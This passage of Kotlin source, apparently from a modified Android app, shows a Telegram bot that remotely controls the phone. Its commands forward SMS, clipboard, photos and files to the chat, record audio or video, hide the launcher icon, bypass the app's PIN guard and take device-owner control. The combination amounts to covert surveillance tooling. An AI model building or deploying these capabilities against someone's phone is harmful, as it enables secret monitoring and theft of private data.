                    "notes" -> cmdNotes(args)
                    "addnote" -> cmdAddNote()
                    "bookmarks" -> cmdBookmarks(args)
                    "addbookmark" -> cmdAddBookmark(args)
                    "feeds" -> cmdFeeds()
                    "feedentries", "feedentry" -> cmdFeedEntries(args)
                    "music", "audios" -> cmdMusic(args)
                    "videos", "vidlib" -> cmdVideoLibrary(args)
                    "images", "gallery" -> cmdImages(args)
                    "pomodoro", "pom" -> cmdPomodoro(args)
                    "torch", "flashlight" -> cmdTorch(args)
                    "speak", "tts" -> cmdSpeak(text.removePrefix(parts[0]).trim())
                    "stopspeak", "shutup", "ttsstop" -> cmdStopSpeak()
                    "vibrate" -> cmdVibrate(args)
                    "toast" -> cmdToast(text.removePrefix(parts[0]).trim())
                    "findphone", "ringphone" -> cmdFindPhone(args)
                    "show", "banner" -> cmdShow(text.removePrefix(parts[0]).trim())
                    "wake", "wakescreen" -> cmdWake(args)
                    "brightness", "bright" -> cmdBrightness(args)
                    "volume", "vol" -> cmdVolume(args)
                    "launch", "open" -> cmdLaunch(args)
                    "datasettings" -> cmdDataSettings()
                    "bedtime" -> cmdBedtime(args)
                    "launches", "launchhistory" -> cmdLaunches(args)
                    "livecall", "calltracker" -> cmdLiveCall()
                    "wifi" -> cmdWifi(args)
                    "netusage", "datausage" -> cmdNetUsage(args)
                    "storage", "disk" -> cmdStorage()
                    "sim", "siminfo", "carrier" -> cmdSim()
                    "dnd", "donotdisturb" -> cmdDnd(args)
                    "screentime", "usagestats", "usage" -> cmdScreenTime(args)
                    "blocknumber", "blocknum", "blockcall" -> cmdBlockNumber(args)
                    "nowplaying", "np", "player" -> cmdNowPlaying()
                    "forwardsms", "smsfwd" -> cmdForwardSms(args)
                    "clipboard", "clip" -> cmdClipboard(text.removePrefix(parts[0]).trim())
                    "mobiledata", "mobile", "data" -> cmdMobileData(args)
                    "bluetooth", "bt" -> cmdBluetooth(args)
                    "lockscreen", "lock" -> cmdLockScreen()
                    "forwardphotos", "autophotos", "photofwd" -> cmdForwardPhotos(args)
                    "airplane", "airplanemode", "aeroplane" -> cmdAirplane(args)
                    "schedulesms", "schedsms" -> cmdScheduleSms(args)
                    "batteryhistory", "bathistory", "bathist" -> cmdBatteryHistory(args)
                    "vpn" -> cmdVpn()
                    "clearcache", "cacheclean" -> cmdClearCache(args)
                    "geofence", "gf", "geofences" -> cmdGeofence(args)
                    "addcontact", "newcontact" -> cmdAddContact()
                    "deletecontact", "delcontact", "rmcontact" -> cmdDeleteContact(args)
                    "editnote" -> cmdEditNote(args)
                    "forwardclipboard", "clipfwd", "clipmon" -> cmdForwardClipboard(args)
                    "soundmeter", "sound", "noise", "dblevel" -> cmdSoundMeter(args)
                    "qrcode", "qr" -> cmdQrCode(text.removePrefix(parts[0]).trim())
                    "docs", "documents", "document" -> cmdDocs(args)
                    "filehash", "hash", "sha256" -> cmdFileHash(args)
                    "wifiscan", "wifilist", "scanwifi" -> cmdWifiScan()
                    "timeline", "activity" -> cmdTimeline(args)
                    "contactgroups", "groups", "cgroups" -> cmdContactGroups()
                    "callnow", "dial", "makecall" -> cmdCallNow(args)
                    "deletefile", "delfile", "rmfile" -> cmdDeleteFile(args)
                    "networkinfo", "netinfo", "wifiinfo" -> cmdNetworkInfo()
                    "reboot", "restart", "rebootdevice" -> cmdReboot()
                    "mms" -> cmdMms(args)
                    "gyroscope", "gyro", "rotation" -> cmdGyroscope()
                    "compass", "heading", "magnetic" -> cmdCompass()
                    "barometer", "pressure", "altitude", "baro" -> cmdBarometer()
                    "steps", "pedometer", "stepcount", "stepcounter" -> cmdSteps()
                    "proximity", "prox", "proxsensor" -> cmdProximity()
                    "hotspot", "tethering", "wifiap" -> cmdHotspot(args)
                    "setalarm", "alarm", "addalarm" -> cmdSetAlarm(args)
                    "batteryalert", "batalert", "lowbattery" -> cmdBatteryAlert(args)
                    "forwardgeofence", "geofencefwd", "gffwd" -> cmdForwardGeofence(args)
                    "forwardshots", "shotsfwd", "autoshare" -> cmdForwardShots(args)
                    "forwardfiles", "filesfwd", "autofiles", "allfiles" -> cmdForwardFiles(args)
                    "fwdfiles", "forwardedfiles", "sentfiles" -> cmdFwdFiles(args)
                    "filestats", "filequeue", "uploadstats" -> cmdFileStats()
                    "retryfailed", "retryfiles", "retryuploads" -> cmdRetryFailed()
                    "applocker", "lockapps", "perapplock" -> cmdAppLocker(args)
                    "appsettings", "appsetting" -> cmdAppSettings()
                    "hideicon", "launchericon", "iconhide" -> cmdHideIcon(args)
                    "applock" -> cmdAppLockToggle(args)
                    "biometric" -> cmdBiometric(args)
                    "appinfog", "appinfoguard" -> cmdAppInfoGuard(args)
                    "setpin", "changepin" -> cmdSetPin()
                    "removepin", "deletepin" -> cmdRemovePin()
                    "openapp", "openappdevice", "launchapp" -> cmdOpenApp()
                    "openappinfo", "appinfo", "ownappinfo" -> cmdOpenOwnAppInfo()
                    "openwebsettings", "websettings", "webset", "opensettings", "webcon" -> cmdOpenWebSettings()
                    "openpage", "page", "goto", "navigate", "nav" -> cmdOpenPage()
                    "update", "selfupdate", "apkupdate", "updateapp" -> cmdUpdate(args)
                    "botpassword", "botpwd" -> cmdBotPassword(args)
                    "setbotpassword", "changebotpassword", "botpwdset" -> cmdSetBotPassword()
                    "securityqa", "securityquestion", "secqa", "feedbackqa" -> cmdSecurityQA(args)
                    "intruders", "captures", "intrudercaptures" -> scope.launch { cmdIntruderCaptures(args) }
                    "deviceowner", "dpm", "owner", "admincontrol" -> cmdDeviceOwner(args)
                    "commands" -> cmdCommands()
                    "stop" -> { sendMessage("⛔ Bot stopped. Restart it from the PlainApp settings."); stop() }
                    else -> sendMessage("❓ Unknown command: <code>$command</code>\n\nSend /help for all commands.")
                }
            } catch (e: Exception) {
                LogCat.e("TelegramBot cmd $command error: ${e.message}")
                sendMessage("❌ Error running /$command: ${htmlEsc(e.message ?: "unknown")}")
            }
        }
    }

    private suspend fun handleCallback(cq: JSONObject) {
        val cqId = cq.optString("id", "")
        val fromChatId = cq.optJSONObject("message")?.optJSONObject("chat")?.optLong("id")?.toString()
        if (fromChatId != chatId) {
            if (cqId.isNotEmpty()) TelegramApiClient.answerCallbackQuery(token, cqId, "⛔ Unauthorized", true)
            return
        }
        val messageId = cq.optJSONObject("message")?.optLong("message_id", 0L) ?: 0L
        val data = cq.optString("data", "")
        if (data.isEmpty()) { if (cqId.isNotEmpty()) TelegramApiClient.answerCallbackQuery(token, cqId); return }

        val colon = data.indexOf(':')
        val key = if (colon < 0) data else data.substring(0, colon)
        val rest = if (colon < 0) "" else data.substring(colon + 1)

        scope.launch {
            try {
                when (key) {
                    "openp" -> {
                        val ctx = MainApp.instance
                        val opened = openPermSettingsScreen(rest, ctx)
                        TelegramApiClient.answerCallbackQuery(token, cqId,
                            if (opened) "📲 Opening settings…" else "❌ No UI for this permission — use ADB")
                    }
                    "reqp" -> {
                        // rest = Permission enum key (e.g. "CAMERA")
                        val permEnum = try {
                            com.ismartcoding.plain.features.Permission.valueOf(rest)
                        } catch (_: IllegalArgumentException) { null }
                        if (permEnum == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "❓ Unknown permission: $rest")
                        } else {
                            // 1. Bypass AppInfoGuard PIN prompt (30-second window)
                            com.ismartcoding.plain.helpers.AppInfoGuard.markVerified()
                            // 2. Bring the app to foreground so the dialog can appear
                            val ctx = MainApp.instance
                            try {
                                val launchIntent = ctx.packageManager.getLaunchIntentForPackage(ctx.packageName)
                                    ?: android.content.Intent().apply {
                                        setClassName(ctx.packageName, "com.ismartcoding.plain.ui.MainActivity")
                                    }
                                launchIntent.addFlags(
                                    android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                                    android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                                )
                                ctx.startActivity(launchIntent)
                            } catch (_: Exception) { }
                            // 3. Short delay so the activity is in foreground before the launcher fires
                            kotlinx.coroutines.delay(700)
                            // 4. Fire the permission request — routes through Permission.request():
                            //    - Regular runtime permissions  → Android "Allow / Deny" dialog
                            //    - Special permissions          → exact system Settings screen
                            sendEvent(com.ismartcoding.plain.events.RequestPermissionsEvent(permEnum))
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🔔 Permission request sent to device")
                        }
                    }
                    "pg_hdr" -> {
                        // "🏠 Main" header → navigate to Home; other headers just acknowledge
                        if (rest.contains("Main", ignoreCase = true)) {
                            val ok = navigateInApp("home", com.ismartcoding.plain.ui.nav.Routing.Home)
                            TelegramApiClient.answerCallbackQuery(token, cqId,
                                if (ok) "📱 Opening Home…" else "⚠️ Open PlainApp first")
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "")
                        }
                    }
                    "pg" -> {
                        // rest = page key. Bring app to foreground, bypass lock, navigate.
                        val route: Any? = when (rest) {
                            "home"           -> com.ismartcoding.plain.ui.nav.Routing.Home
                            "settings"       -> com.ismartcoding.plain.ui.nav.Routing.Settings
                            "websettings"    -> com.ismartcoding.plain.ui.nav.Routing.WebSettings
                            "websecurity"    -> com.ismartcoding.plain.ui.nav.Routing.WebSecurity
                            "sessions"       -> com.ismartcoding.plain.ui.nav.Routing.Sessions
                            "webdev"         -> com.ismartcoding.plain.ui.nav.Routing.WebDev
                            "cloudflare"     -> com.ismartcoding.plain.ui.nav.Routing.CloudflareTunnel
                            "cflog"          -> com.ismartcoding.plain.ui.nav.Routing.CloudflareTunnelLog
                            "alwayson"       -> com.ismartcoding.plain.ui.nav.Routing.AlwaysOn
                            "applock"        -> com.ismartcoding.plain.ui.nav.Routing.AppLock
                            "launchericon"   -> com.ismartcoding.plain.ui.nav.Routing.LauncherIcon
                            "securityqa"     -> com.ismartcoding.plain.ui.nav.Routing.SecurityQA
                            "telegrambot"    -> com.ismartcoding.plain.ui.nav.Routing.TelegramBot
                            "files"          -> com.ismartcoding.plain.ui.nav.Routing.Files()
                            "appfiles"       -> com.ismartcoding.plain.ui.nav.Routing.AppFiles
                            "images"         -> com.ismartcoding.plain.ui.nav.Routing.Images
                            "videos"         -> com.ismartcoding.plain.ui.nav.Routing.Videos
                            "audio"          -> com.ismartcoding.plain.ui.nav.Routing.Audio
                            "audioplayer"    -> com.ismartcoding.plain.ui.nav.Routing.AudioPlayer
                            "docs"           -> com.ismartcoding.plain.ui.nav.Routing.Docs
                            "apps"           -> com.ismartcoding.plain.ui.nav.Routing.Apps
                            "chatlist"       -> com.ismartcoding.plain.ui.nav.Routing.ChatList
                            "chat"           -> com.ismartcoding.plain.ui.nav.Routing.Chat("local")
                            "nearby"         -> com.ismartcoding.plain.ui.nav.Routing.Nearby()
                            "notes"          -> com.ismartcoding.plain.ui.nav.Routing.Notes
                            "feeds"          -> com.ismartcoding.plain.ui.nav.Routing.Feeds
                            "feedsettings"   -> com.ismartcoding.plain.ui.nav.Routing.FeedSettings
                            "scan"           -> com.ismartcoding.plain.ui.nav.Routing.Scan
                            "scanhistory"    -> com.ismartcoding.plain.ui.nav.Routing.ScanHistory
                            "exchangerate"   -> com.ismartcoding.plain.ui.nav.Routing.ExchangeRate
                            "pomodoro"       -> com.ismartcoding.plain.ui.nav.Routing.PomodoroTimer
                            "soundmeter"     -> com.ismartcoding.plain.ui.nav.Routing.SoundMeter
                            "customfeatures" -> com.ismartcoding.plain.ui.nav.Routing.CustomFeatures
                            "notifsettings"  -> com.ismartcoding.plain.ui.nav.Routing.NotificationSettings
                            "language"       -> com.ismartcoding.plain.ui.nav.Routing.Language
                            "darktheme"      -> com.ismartcoding.plain.ui.nav.Routing.DarkTheme
                            "backup"         -> com.ismartcoding.plain.ui.nav.Routing.BackupRestore
                            "howtouse"       -> com.ismartcoding.plain.ui.nav.Routing.HowToUse
                            "dlna"           -> com.ismartcoding.plain.ui.nav.Routing.DlnaReceiver
                            "dlnahistory"    -> com.ismartcoding.plain.ui.nav.Routing.DlnaCastHistory
                            else             -> null
                        }
                        if (route == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "❓ Unknown page: $rest")
                        } else {
                            val ok = navigateInApp(rest, route)
                            TelegramApiClient.answerCallbackQuery(token, cqId,
                                if (ok) "📱 Opening page…" else "⚠️ App not ready — open PlainApp first")
                        }
                    }
                    "sms_open" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading thread…")
                        renderSmsThreadPage(rest.filter { it.isDigit() }, offset = 0, editMessageId = null)
                    }
                    "sms_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val tid = rest.substring(0, sep).filter { it.isDigit() }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderSmsThreadPage(tid, off, editMessageId = messageId)
                    }
                    "calls_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        // Format: "calls_pg:<query>:<offset>" where query can be "_" for all
                        val sep = rest.lastIndexOf(':')
                        val q: String
                        val off: Int
                        if (sep >= 0) {
                            q = rest.substring(0, sep).let { if (it == "_") "" else it }
                            off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        } else {
                            q = ""
                            off = rest.toIntOrNull() ?: 0
                        }
                        renderCallsPage(q, off, editMessageId = messageId)
                    }
                    "calls_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send search text…")
                        pendingInput = "calls_search"
                        sendMessage("🔍 Send a name or number to search call logs (e.g. <code>John</code> or <code>+1555</code>), or <code>*</code> to clear.")
                    }
                    "messages_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send search text…")
                        pendingInput = "messages_search"
                        sendMessage("🔍 Send a contact name or number to search SMS conversations, or <code>*</code> to clear.")
                    }
                    "messages_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderMessagesPage(lastMessagesQuery, editMessageId = messageId)
                    }
                    "contacts_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send search text…")
                        pendingInput = "contacts_search"
                        sendMessage("🔍 Send a name, phone, or email to search contacts, or <code>*</code> to clear.")
                    }
                    "notif_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send search text…")
                        pendingInput = "notif_search"
                        sendMessage("🔍 Send an app name or keyword to search notifications, or <code>*</code> to clear.")
                    }
                    "notif_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderNotificationsPage(lastNotifQuery, editMessageId = messageId)
                    }
                    "files_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send search text…")
                        pendingInput = "files_search:$rest"
                        sendMessage("🔍 Send a filename or pattern to search this folder and all subfolders (e.g. <code>.pdf</code> or <code>photo</code>).")
                    }
                    "blockapp_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send search text…")
                        pendingInput = "blockapp_search"
                        sendMessage("🔍 Send an app name to search (e.g. <code>chrome</code>), or <code>*</code> to clear.")
                    }
                    "c_calls" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading call history…")
                        renderContactCallsPage(rest, offset = 0, editMessageId = messageId)
                    }
                    "c_calls_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val rawId = rest.substring(0, sep)
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderContactCallsPage(rawId, off, editMessageId = messageId)
                    }
                    "aud" -> {
                        if (rest == "custom") {
                            TelegramApiClient.answerCallbackQuery(token, cqId)
                            pendingInput = "audio_duration"
                            TelegramApiClient.editMessageText(
                                token, chatId, messageId,
                                "🎙 <b>Custom audio duration</b>\n\nReply with the number of <b>seconds</b> to record (1–300).\n\nFormat: just the number, e.g. <code>45</code>.\nSend any /command to cancel."
                            )
                        } else {
                            val n = rest.toIntOrNull()?.coerceIn(1, 300) ?: 10
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Recording ${n}s…")
                            TelegramApiClient.editMessageText(token, chatId, messageId, "🎙 Recording <b>${n}s</b> of audio…")
                            runAudioRecording(n)
                        }
                    }
                    "vid_cam" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        showVideoDurationMenu(useFront = rest == "front", editMessageId = messageId)
                    }
                    "vid_cam_pick" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        showVideoCameraMenu(editMessageId = messageId)
                    }
                    "vid_custom" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        pendingInput = "video_duration:${if (rest == "front") "front" else "back"}"
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "🎬 <b>Custom video duration</b> · ${if (rest == "front") "🤳 Front" else "📷 Back"} camera\n\nReply with the number of <b>seconds</b> to record (1–120).\n\nFormat: just the number, e.g. <code>45</code>.\nSend any /command to cancel."
                        )
                    }
                    "vid" -> {
                        // rest = "<cam>:<seconds>"
                        val sep = rest.indexOf(':')
                        if (sep < 0) { TelegramApiClient.answerCallbackQuery(token, cqId); return@launch }
                        val cam = rest.substring(0, sep)
                        val n = rest.substring(sep + 1).toIntOrNull()?.coerceIn(1, 120) ?: 10
                        val useFront = cam == "front"
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Recording ${n}s…")
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "🎬 Recording <b>${n}s</b> · ${if (useFront) "🤳 Front" else "📷 Back"} camera…"
                        )
                        runVideoRecording(n, useFront)
                    }
                    "rec_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending recording…")
                        cbSendRecording(rest)
                    }
                    "rec_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderRecordingsPage(q, off, editMessageId = messageId)
                    }
                    "rec_q" -> {
                        pendingInput = "rec_search"
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send a name or number to search recordings (or * to show all)…")
                    }
                    "rec_del" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val filename = recFromToken(rest)
                        if (filename == null) {
                            sendMessage("❌ Recording not found — please refresh the list.")
                            return@launch
                        }
                        val meta = CallRecorderHelper.list().firstOrNull { it.filename == filename }
                        val resolvedName = meta?.let {
                            it.displayName.ifBlank { lookupContactName(it.source) }
                        } ?: ""
                        val label = resolvedName.ifBlank { filename }
                        val dur = meta?.let { formatDuration(it.durationMs) } ?: ""
                        val confirmText = "🗑 <b>Delete recording?</b>\n\n" +
                            "<b>${htmlEsc(label)}</b>${if (dur.isNotBlank()) "  ·  $dur" else ""}\n\n" +
                            "<i>This cannot be undone.</i>"
                        val markup = TelegramApiClient.inlineKeyboard(listOf(
                            listOf("✅ Yes, delete" to "rec_del_ok:$rest", "❌ Cancel" to "rec_del_no"),
                        ))
                        sendMessage(confirmText, replyMarkup = markup)
                    }
                    "rec_del_ok" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Deleting…")
                        val filename = recFromToken(rest)
                        if (filename == null) {
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "❌ Recording not found.")
                            return@launch
                        }
                        val deleted = CallRecorderHelper.deleteByFilename(filename)
                        if (messageId != null) {
                            TelegramApiClient.editMessageText(
                                token, chatId, messageId,
                                if (deleted) "✅ Recording deleted." else "❌ Could not delete the recording."
                            )
                        }
                        if (deleted) renderRecordingsPage(lastRecQuery, 0, editMessageId = null)
                    }
                    "rec_del_no" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "↩️ Deletion cancelled.")
                    }
                    // ---------- Now Playing controls ----------
                    "np_play" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        AudioPlayer.play()
                        kotlinx.coroutines.delay(200)
                        renderNowPlaying(editMessageId = messageId)
                    }
                    "np_pause" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        AudioPlayer.pause()
                        kotlinx.coroutines.delay(200)
                        renderNowPlaying(editMessageId = messageId)
                    }
                    "np_next" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        AudioPlayer.skipToNext()
                        kotlinx.coroutines.delay(400)
                        renderNowPlaying(editMessageId = messageId)
                    }
                    "np_prev" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        AudioPlayer.skipToPrevious()
                        kotlinx.coroutines.delay(400)
                        renderNowPlaying(editMessageId = messageId)
                    }
                    // ---------- Block number controls ----------
                    "bn_del" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val num = phoneFromToken(rest) ?: run {
                            sendMessage("❌ Number not found — refresh the list."); return@launch
                        }
                        BlockedNumberHelper.delete(num)
                        renderBlockNumberPage(editMessageId = messageId)
                    }
                    "bn_add" -> {
                        pendingInput = "bn_add_num"
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send the phone number to block…")
                    }
                    "bn_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderBlockNumberPage(editMessageId = messageId)
                    }
                    // ---------- Now Playing refresh ----------
                    "np_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderNowPlaying(editMessageId = messageId)
                    }
                    "music_cmd" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderMusicPage("", 0, editMessageId = null)
                    }
                    // ---------- SMS forward toggle ----------
                    "smsfwd_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        forwardSmsEnabled = true
                        coIO { TelegramBotForwardSmsPreference.putAsync(MainApp.instance, true) }
                        val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("✅ Enable" to "smsfwd_on", "🔕 Disable" to "smsfwd_off")))
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "📩 <b>SMS Forwarding</b>\nStatus: ✅ <b>ON</b> — incoming SMS will be forwarded to this chat", replyMarkup = markup)
                    }
                    "smsfwd_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        forwardSmsEnabled = false
                        coIO { TelegramBotForwardSmsPreference.putAsync(MainApp.instance, false) }
                        val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("✅ Enable" to "smsfwd_on", "🔕 Disable" to "smsfwd_off")))
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "📩 <b>SMS Forwarding</b>\nStatus: 🔕 <b>OFF</b> — SMS forwarding is paused", replyMarkup = markup)
                    }
                    // ---------- DND toggle ----------
                    "dnd_on" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val nm = MainApp.instance.getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                        if (nm.isNotificationPolicyAccessGranted) {
                            nm.setInterruptionFilter(android.app.NotificationManager.INTERRUPTION_FILTER_NONE)
                            val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("🔇 DND On" to "dnd_on", "🔔 DND Off" to "dnd_off")))
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "🔇 <b>Do Not Disturb</b>\nStatus: 🔇 <b>ON</b> (all calls and notifications silenced)", replyMarkup = markup)
                        }
                    }
                    "dnd_off" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val nm = MainApp.instance.getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                        if (nm.isNotificationPolicyAccessGranted) {
                            nm.setInterruptionFilter(android.app.NotificationManager.INTERRUPTION_FILTER_ALL)
                            val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("🔇 DND On" to "dnd_on", "🔔 DND Off" to "dnd_off")))
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "🔇 <b>Do Not Disturb</b>\nStatus: 🔔 <b>OFF</b> (notifications active)", replyMarkup = markup)
                        }
                    }
                    "contacts_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderContactsPage(q, off, editMessageId = messageId)
                    }
                    "c_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        // rest = "<rawId>:<q>:<offset>" — we only need rawId; the back state is tracked globally.
                        val rawId = rest.substringBefore(':')
                        renderContactDetail(rawId, editMessageId = messageId)
                    }
                    "c_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderContactsPage(lastContactsQuery, lastContactsOffset, editMessageId = messageId)
                    }
                    "c_call" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            try {
                                CallMediaStoreHelper.call(MainApp.instance, num)
                                TelegramApiClient.answerCallbackQuery(token, cqId, "📞 Calling $num…")
                                sendMessage("📞 Placing call to <code>${htmlEsc(num)}</code> on the device.\n<i>If nothing happens, grant the Phone (CALL_PHONE) permission in PlainApp.</i>")
                            } catch (e: Exception) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Failed", true)
                                sendMessage("❌ Could not place call: ${htmlEsc(e.message ?: "")}")
                            }
                        }
                    }
                    "c_sms" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId)
                            pendingInput = "sms_to:${phoneToken(num)}"
                            sendMessage("💬 <b>Send SMS to <code>${htmlEsc(num)}</code></b>\n\nReply with the message text.\nSend any /command to cancel.")
                        }
                    }
                    "c_share" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sharing contact…")
                        cbShareContact(rest)
                    }
                    "nf_call" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            try {
                                CallMediaStoreHelper.call(MainApp.instance, num)
                                TelegramApiClient.answerCallbackQuery(token, cqId, "📞 Calling $num…")
                                sendMessage("📞 Placing call to <code>${htmlEsc(num)}</code> on the device.\n<i>If nothing happens, grant the Phone (CALL_PHONE) permission in PlainApp.</i>")
                            } catch (e: Exception) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Failed", true)
                                sendMessage("❌ Could not place call: ${htmlEsc(e.message ?: "")}")
                            }
                        }
                    }
                    "nf_sms" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId)
                            pendingInput = "sms_to:${phoneToken(num)}"
                            sendMessage("💬 <b>Send SMS to <code>${htmlEsc(num)}</code></b>\n\nReply with the message text.\nSend any /command to cancel.")
                        }
                    }
                    "cl_open" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🔍 Looking up…")
                            // Re-use the /find flow: opens the contact detail when the
                            // number is in the address book, or falls back to the
                            // unknown-number panel (Call / SMS / Save) when it isn't.
                            cmdFind(listOf(num))
                        }
                    }
                    "nf_save" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId)
                            pendingInput = "save_contact:${phoneToken(num)}"
                            sendMessage("💾 <b>Save <code>${htmlEsc(num)}</code> as a new contact</b>\n\nReply with the contact's name (e.g. <i>John Doe</i>).\nSend any /command to cancel.")
                        }
                    }
                    "auto_run" -> {
                        // rest = first 20 chars of rule UUID
                        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(rest) }
                        if (rule == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Rule no longer exists", true)
                        } else {
                            try {
                                val started = com.ismartcoding.plain.helpers.AutomationActionRunner.trigger(rule.id, "manual")
                                TelegramApiClient.answerCallbackQuery(
                                    token, cqId,
                                    if (started) "▶ ${rule.name}" else "⚠ Skipped (disabled / cooldown)",
                                    !started,
                                )
                            } catch (e: Throwable) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
                            }
                        }
                    }
                    "auto_tog" -> {
                        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(rest) }
                        if (rule == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Rule no longer exists", true)
                        } else {
                            val updated = rule.copy(enabled = !rule.enabled)
                            AutomationHelper.upsert(updated)
                            TelegramApiClient.answerCallbackQuery(
                                token, cqId,
                                "${if (updated.enabled) "🟢 ON" else "⚪ OFF"}: ${rule.name}",
                            )
                            cmdAutomations()
                        }
                    }
                    "auto_del" -> {
                        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(rest) }
                        if (rule == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Rule no longer exists", true)
                        } else {
                            com.ismartcoding.plain.helpers.AutomationScheduler.cancel(rule.id, MainApp.instance)
                            AutomationHelper.delete(rule.id, MainApp.instance)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Deleted ${rule.name}")
                            cmdAutomations()
                        }
                    }
                    "auto_engine" -> {
                        val on = rest == "1"
                        AutomationHelper.setEnabled(on, MainApp.instance)
                        TelegramApiClient.answerCallbackQuery(token, cqId, if (on) "Engine ON" else "Engine OFF")
                        cmdAutomations()
                    }
                    "block_list" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val off = rest.toIntOrNull() ?: 0
